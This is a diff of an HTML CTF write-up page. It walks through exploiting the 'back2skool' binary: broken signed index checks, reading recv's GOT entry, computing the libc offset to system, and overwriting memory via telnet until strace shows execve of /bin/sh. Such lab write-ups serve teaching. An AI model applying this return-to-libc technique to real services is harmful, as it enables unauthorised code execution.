@@ -94,7 +94,7 @@
       <br />
       <span class="meta">
         Tagged:
-        <span class="tags"><a href="./tags/exploit.html">exploit</a>, <a href="./tags/ctf.html">ctf</a>, <a href="./tags/return-to-libc.html">return-to-libc</a>, <a href="./tags/strace.html">strace</a>, <a href="./tags/debugging.html">debugging</a>, <a href="./tags/gdb.html">gdb</a>, <a href="./tags/write-up.html">write-up</a></span>
+        <span class="tags"><a title="All pages tagged 'exploit'." href="./tags/exploit.html">exploit</a>, <a title="All pages tagged 'ctf'." href="./tags/ctf.html">ctf</a>, <a title="All pages tagged 'return-to-libc'." href="./tags/return-to-libc.html">return-to-libc</a>, <a title="All pages tagged 'strace'." href="./tags/strace.html">strace</a>, <a title="All pages tagged 'debugging'." href="./tags/debugging.html">debugging</a>, <a title="All pages tagged 'gdb'." href="./tags/gdb.html">gdb</a>, <a title="All pages tagged 'write-up'." href="./tags/write-up.html">write-up</a></span>
       </span>
 
       <section id="introduction" class="level1">
@@ -228,13 +228,13 @@ Connection closed by foreign host.</code></pre>
 <p>As you can <em>not</em> see, there is no check code for the index when we’re doing a <em>read</em> operation.</p>
 <p><img style="float:center" src="./images/ida-atoi-write.png" alt="Write - atoi" /></p>
 <p>For the <em>write</em> operation there is checking using the instruction <code>jle</code>. But <code>jle</code> instruction is used for comparing <em>signed</em> integers. The instruction <code>jbe</code> should be used in this case which compares <em>unsigned</em> integers. You can find more on this <a href="http://en.wikibooks.org/wiki/X86_Assembly/Control_Flow#Jump_if_Less">wiki article</a>. Probably the original code looks something like this:</p>
-<div class="sourceCode"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span class="dt">int</span> i;
-i = atoi(str);
-<span class="cf">if</span> (i &gt; <span class="dv">9</span>) {
-	error();
-	exit();
-}
-do_stuff;</code></pre></div>
+<div class="sourceCode" id="cb13"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb13-1"><a href="#cb13-1"></a><span class="dt">int</span> i;</span>
+<span id="cb13-2"><a href="#cb13-2"></a>i = atoi(str);</span>
+<span id="cb13-3"><a href="#cb13-3"></a><span class="cf">if</span> (i &gt; <span class="dv">9</span>) {</span>
+<span id="cb13-4"><a href="#cb13-4"></a>	error();</span>
+<span id="cb13-5"><a href="#cb13-5"></a>	exit();</span>
+<span id="cb13-6"><a href="#cb13-6"></a>}</span>
+<span id="cb13-7"><a href="#cb13-7"></a>do_stuff;</span></code></pre></div>
 <p>One way to correct the above code is to have an unsigned comparison or check for negative values. Both would work in this case, but then we couldn’t solve this level :-).</p>
 <p>In short, the <strong>index checking</strong> is <strong>broken</strong>. We can use any index for the <strong>read</strong> operation and for the <strong>write</strong> only negative indices. When you can write anything to any address of a program, the rest is just implementation.</p>
 </section>
@@ -336,9 +336,7 @@ Program terminated with signal 11, Segmentation fault.
 <li>you can test this by computing 2^33 + 0x804c040-4*(2^31 - (0x38/4)) - because of the way the buffer is addressed (4 bytes values, <a href="http://en.wikipedia.org/wiki/Addressing_mode#Scaled">scaled addressing</a>) the overflow is ignored and the index value <em>wraps</em> around. We need to do <em>wrap</em> around only when we try to access a value above the base address of the vector.</li>
 </ul>
 <p>The instruction pointer is the value that we wrote, 0x11111111 in decimal is <strong>286331153</strong>, so we’ve managed to modify the flow of the program by doing a write, and we’ve managed to do so in a predictable way.</p>
-</section>
-<section id="second-poc" class="level2">
-<h2>Second PoC</h2>
+<p>##Second PoC</p>
 <p>We are in the following state: we’ve managed to make our program to jump at any location. But <strong>where</strong> to jump? Because we don’t have any possibility of injecting code, we should rely on the available code. Available code means, our code and the dynamic libraries code which are mapped in our address space.</p>
 <p>Let’s inspect again our binary to see what is used from shared libraries.</p>
 <pre><code>$ nm -D -u ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f 
@@ -352,48 +350,48 @@ $ </code></pre>
 <ul>
 <li>finding the address of a used function is <strong>simple</strong>, we can use the GOT and read the value of the pointer which has been already filled in by the loader. Because of the lazy linking, we only have to be careful to choose a function which has been previously called. We will choose <code>recv</code> for this purpose.</li>
 </ul>
-<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="ex">objdump</span> -dS ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f  <span class="kw">|</span> <span class="fu">grep</span> -A2 recv@plt
-<span class="ex">08048980</span> <span class="op">&lt;</span>recv@plt<span class="op">&gt;</span>:
- <span class="ex">8048980</span>:	ff 25 c0 bf 04 08    	jmp    *0x804bfc0</code></pre></div>
+<div class="sourceCode" id="cb19"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1"></a>$ <span class="ex">objdump</span> -dS ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f  <span class="kw">|</span> <span class="fu">grep</span> -A2 recv@plt</span>
+<span id="cb19-2"><a href="#cb19-2"></a><span class="ex">08048980</span> <span class="op">&lt;</span>recv@plt<span class="op">&gt;</span>:</span>
+<span id="cb19-3"><a href="#cb19-3"></a> <span class="ex">8048980</span>:	ff 25 c0 bf 04 08    	jmp    *0x804bfc0</span></code></pre></div>
 <p><strong>0x804bfc0</strong> is the GOT entry for <code>recv</code> function.</p>
 <ul>
 <li>finding the relative offset of the function that we want to jump to (e.g. <code>system</code>) is <strong>difficult</strong>. This offset depends on the version of libc that is used on the target system. To make things simple, we will focus first on exploiting locally - meaning that we have access to our libc file. To compute the offset we only have to find the function entries in libc.</li>
 </ul>
-<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="ex">readelf</span> -s /lib/tls/i686/cmov/libc.so.6 <span class="kw">|</span> <span class="fu">grep</span> <span class="st">' recv@'</span>
-  <span class="ex">1124</span>: 000cebf0   118 FUNC    WEAK   DEFAULT   12 recv@@GLIBC_2.0
-$ <span class="ex">readelf</span> -s /lib/tls/i686/cmov/libc.so.6 <span class="kw">|</span> <span class="fu">grep</span> <span class="st">' system@'</span>
-  <span class="ex">1398</span>: 00039100   125 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
-$ <span class="bu">echo</span> <span class="va">$((</span>0x00039100-0x000cebf0<span class="va">))</span>
-<span class="ex">-613104</span></code></pre></div>
+<div class="sourceCode" id="cb20"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1"></a>$ <span class="ex">readelf</span> -s /lib/tls/i686/cmov/libc.so.6 <span class="kw">|</span> <span class="fu">grep</span> <span class="st">' recv@'</span></span>
+<span id="cb20-2"><a href="#cb20-2"></a>  <span class="ex">1124</span>: 000cebf0   118 FUNC    WEAK   DEFAULT   12 recv@@GLIBC_2.0</span>
+<span id="cb20-3"><a href="#cb20-3"></a>$ <span class="ex">readelf</span> -s /lib/tls/i686/cmov/libc.so.6 <span class="kw">|</span> <span class="fu">grep</span> <span class="st">' system@'</span></span>
+<span id="cb20-4"><a href="#cb20-4"></a>  <span class="ex">1398</span>: 00039100   125 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0</span>
+<span id="cb20-5"><a href="#cb20-5"></a>$ <span class="bu">echo</span> <span class="va">$((</span>0x00039100-0x000cebf0<span class="va">))</span></span>
+<span id="cb20-6"><a href="#cb20-6"></a><span class="ex">-613104</span></span></code></pre></div>
 <p>The offset is -613104, <strong>note</strong> that it depends on the version of libc, hence the exploit isn’t too reliable. Let’s focus though on exploiting locally and postpone the computation of the remote offset. We will write at the same address as in PoC1 but we will write the value of <code>system</code> function i.e. <code>address_of_recv_function+OFFSET</code>.</p>
-<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="ex">telnet</span> localhost 31337
-<span class="bu">read</span>
-<span class="ex">Input</span> position to read from:
-<span class="ex">-32</span>
-<span class="ex">Value</span> at position -32: -1217696784
-<span class="fu">write</span>
-<span class="ex">Input</span> position to write to:
-<span class="ex">-2147483634</span>
-<span class="ex">Input</span> numeric value to write:
-<span class="ex">-1218309888</span>
-<span class="ex">Value</span> at position -2147483634: -1218309888
-<span class="ex">math</span>
-<span class="ex">Result</span> of math: -1</code></pre></div>
+<div class="sourceCode" id="cb21"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1"></a>$ <span class="ex">telnet</span> localhost 31337</span>
+<span id="cb21-2"><a href="#cb21-2"></a><span class="bu">read</span></span>
+<span id="cb21-3"><a href="#cb21-3"></a><span class="ex">Input</span> position to read from:</span>
+<span id="cb21-4"><a href="#cb21-4"></a><span class="ex">-32</span></span>
+<span id="cb21-5"><a href="#cb21-5"></a><span class="ex">Value</span> at position -32: -1217696784</span>
+<span id="cb21-6"><a href="#cb21-6"></a><span class="fu">write</span></span>
+<span id="cb21-7"><a href="#cb21-7"></a><span class="ex">Input</span> position to write to:</span>
+<span id="cb21-8"><a href="#cb21-8"></a><span class="ex">-2147483634</span></span>
+<span id="cb21-9"><a href="#cb21-9"></a><span class="ex">Input</span> numeric value to write:</span>
+<span id="cb21-10"><a href="#cb21-10"></a><span class="ex">-1218309888</span></span>
+<span id="cb21-11"><a href="#cb21-11"></a><span class="ex">Value</span> at position -2147483634: -1218309888</span>
+<span id="cb21-12"><a href="#cb21-12"></a><span class="ex">math</span></span>
+<span id="cb21-13"><a href="#cb21-13"></a><span class="ex">Result</span> of math: -1</span></code></pre></div>
 <p>Reading from <code>-32</code> it’s equivalent of reading <code>-32*4</code> bytes before our buffer. <code>0x804c040-32*4</code> is <code>0x804bfc0</code>, this is the <code>recv</code> GOT entry. <code>-1218309888</code> is <code>-1217696784-613104</code>.</p>
 <p>Hey, it didn’t crashed, that’s a plus! Meanwhile, back at the castle.</p>
-<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="ex">strace</span> -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
-[<span class="ex">...</span>]
-[<span class="ex">pid</span>  4901] send(4, <span class="st">&quot;Value at position -2147483634: -&quot;</span>..., 43, 0) = <span class="ex">43</span>
-[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;m&quot;</span>, 1)             = <span class="ex">1</span>
-[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;a&quot;</span>, 1)             = <span class="ex">1</span>
-[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;t&quot;</span>, 1)             = <span class="ex">1</span>
-[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;h&quot;</span>, 1)             = <span class="ex">1</span>
-[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;\r&quot;</span>, 1)            = <span class="ex">1</span>
-[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;\n&quot;</span>, 1)            = <span class="ex">1</span>
-[<span class="ex">...</span>]
-[<span class="ex">pid</span>  4902] execve(<span class="st">&quot;/bin/sh&quot;</span>, [<span class="st">&quot;sh&quot;</span>, <span class="st">&quot;-c&quot;</span>, <span class="st">&quot;&quot;</span>], [/* 31 vars */]) = <span class="ex">0</span>
-[<span class="ex">pid</span>  4902] brk(0)                      = <span class="ex">0x9a04000</span>
-[<span class="ex">...</span>]</code></pre></div>
+<div class="sourceCode" id="cb22"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1"></a>$ <span class="ex">strace</span> -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f</span>
+<span id="cb22-2"><a href="#cb22-2"></a>[<span class="ex">...</span>]</span>
+<span id="cb22-3"><a href="#cb22-3"></a>[<span class="ex">pid</span>  4901] send(4, <span class="st">&quot;Value at position -2147483634: -&quot;</span>..., 43, 0) = <span class="ex">43</span></span>
+<span id="cb22-4"><a href="#cb22-4"></a>[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;m&quot;</span>, 1)             = <span class="ex">1</span></span>
+<span id="cb22-5"><a href="#cb22-5"></a>[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;a&quot;</span>, 1)             = <span class="ex">1</span></span>
+<span id="cb22-6"><a href="#cb22-6"></a>[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;t&quot;</span>, 1)             = <span class="ex">1</span></span>
+<span id="cb22-7"><a href="#cb22-7"></a>[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;h&quot;</span>, 1)             = <span class="ex">1</span></span>
+<span id="cb22-8"><a href="#cb22-8"></a>[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;\r&quot;</span>, 1)            = <span class="ex">1</span></span>
+<span id="cb22-9"><a href="#cb22-9"></a>[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;\n&quot;</span>, 1)            = <span class="ex">1</span></span>
+<span id="cb22-10"><a href="#cb22-10"></a>[<span class="ex">...</span>]</span>
+<span id="cb22-11"><a href="#cb22-11"></a>[<span class="ex">pid</span>  4902] execve(<span class="st">&quot;/bin/sh&quot;</span>, [<span class="st">&quot;sh&quot;</span>, <span class="st">&quot;-c&quot;</span>, <span class="st">&quot;&quot;</span>], [/* 31 vars */]) = <span class="ex">0</span></span>
+<span id="cb22-12"><a href="#cb22-12"></a>[<span class="ex">pid</span>  4902] brk(0)                      = <span class="ex">0x9a04000</span></span>
+<span id="cb22-13"><a href="#cb22-13"></a>[<span class="ex">...</span>]</span></code></pre></div>
 <p>We successfully <strong>called <code>execve</code></strong>!</p>
 </section>
 <section id="parameters-to-execve" class="level2">
